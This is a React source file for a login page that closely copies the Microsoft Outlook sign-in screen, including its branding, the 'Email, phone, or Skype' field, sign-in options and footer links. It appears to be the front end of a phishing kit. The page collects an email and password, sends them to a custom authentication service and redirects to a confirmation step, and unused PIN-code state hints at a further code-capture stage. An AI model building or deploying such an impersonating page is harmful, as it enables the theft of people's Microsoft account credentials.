import "./assets/app.css";
import logo from "./assets/logo.png"
import {useState} from 'react';
import * as React from "react";
import axios from "axios"
import { redirect } from 'react-router-dom'
import {browserHistory} from "react-router"
import auth from './services/authService'
import global from "global"

const LoginPage = (props) => {

  const [window, setWindow] = useState(false)
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [loggedIn, setLoggedIn] = useState(false)
  const [PINCode, setPINCode] = useState("")
  const [error, setError] = useState("")
  const [introduceCode, setIntroduceCode] = useState(false)

  const handleNext = () => {
    setWindow(true)
  }

  React.useEffect(() => {
    setLoggedIn(false)
    setEmail("")
    setPassword("")
    setIntroduceCode(false)
    setPINCode("")
    
    console.log()
  }, [])

  const handleEmail = (e) => {
    setEmail(e.target.value)
  }

  const handlePassword = (e) => {
    setPassword(e.target.value)
  }


  const handleLogin = async () => {
    try {
      const res = await auth.login(email, password)
      global.window.location.href = "/confirm-login?email=" + email

    
    } catch(err) {
      console.log(err)
      global.window.location.href = "/"
      if (err.response.data) setError(err.response.data.message)
    }  
  }

  return !window ? (
    
    <div className="App">
      <div id="section_uname" className=" ">
        <p>Outlook</p>
        <div className="auth-wrapper">
          <img src={logo} alt="Microsoft" />
          <h2 className="title mb-16 mt-16">Sign in</h2>
          <form>
              <div className="mb-16">
                  <small>{error}</small>
                  <input id="inp_uname" type="email" name="uname" className="input" onChange={handleEmail} value={email} placeholder="Email, phone, or Skype" />
              </div>
          </form>
          
          <div>
              <button className="btn" onClick={handleNext} id="btn_next">Next</button>
          </div>
      </div>
      <div className="opts">
          <p className="has-icon mb-0" style={{fontSize: "15px"}}><span className="icon"><img src="assets/key.png" width="30px" /></span> Sign-in options</p>
      </div>
      </div>

    <footer className="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <span>.&nbsp;.&nbsp;.</span>
    </footer>
    </div>
  ) : (
    <div className="App">

      <section id="section_uname">
        <p>Outlook</p>
        <div className="auth-wrapper">
          <img src={logo} alt="Microsoft" />
          <h2 className="title mb-16 mt-16">Sign in</h2>
          <form>
              <div className="mb-16">
                  <small>{error}</small>
                  <input id="inp_uname" type="password" name="uname" className="input" onChange={handlePassword} value={password} placeholder="Password" />
              </div>
          </form>
          
          <div>
              <button className="btn" onClick={handleLogin} id="btn_next">Login</button>
          </div>
      </div>
      <div className="opts">
          <p className="has-icon mb-0" style={{fontSize: "15px"}}><span className="icon"><img src="assets/key.png" width="30px" /></span> Sign-in options</p>
      </div>
      </section>

    <footer className="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <span>.&nbsp;.&nbsp;.</span>
    </footer>
    </div>
  )
}

export default LoginPage;
